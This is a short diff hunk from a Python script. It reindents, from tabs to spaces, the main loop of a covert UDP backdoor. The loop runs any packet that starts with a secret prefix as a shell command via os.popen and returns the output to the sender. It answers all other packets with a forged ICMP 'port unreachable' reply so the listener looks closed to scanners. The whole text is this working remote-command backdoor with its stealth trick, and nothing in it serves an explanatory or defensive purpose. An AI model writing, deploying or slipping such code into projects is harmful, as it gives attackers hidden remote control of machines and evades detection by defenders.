@@ -26,12 +26,12 @@ recsock.bind((UDP_IP, UDP_PORT))
 fakesock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
 
 while True:
-	data, addr = recsock.recvfrom(1024)
-	data = data.decode("utf-8")
-	if(data[:len(SECRET)] == SECRET):
-		data = data[len(SECRET):]
-		ret = os.popen("%s" % data).read()
-		recsock.sendto(ret.encode("utf-8"), addr)	
-	else:
-		icmp = struct.pack('bbHi', HOST_UNREACHABLE, PORT_UNREACHABLE, 0xfcfc, 0)
-		fakesock.sendto(icmp, addr)
+    data, addr = recsock.recvfrom(1024)
+    data = data.decode("utf-8")
+    if(data[:len(SECRET)] == SECRET):
+        data = data[len(SECRET):]
+        ret = os.popen("%s" % data).read()
+        recsock.sendto(ret.encode("utf-8"), addr)
+    else:
+        icmp = struct.pack('bbHi', HOST_UNREACHABLE, PORT_UNREACHABLE, 0xfcfc, 0)
+        fakesock.sendto(icmp, addr)
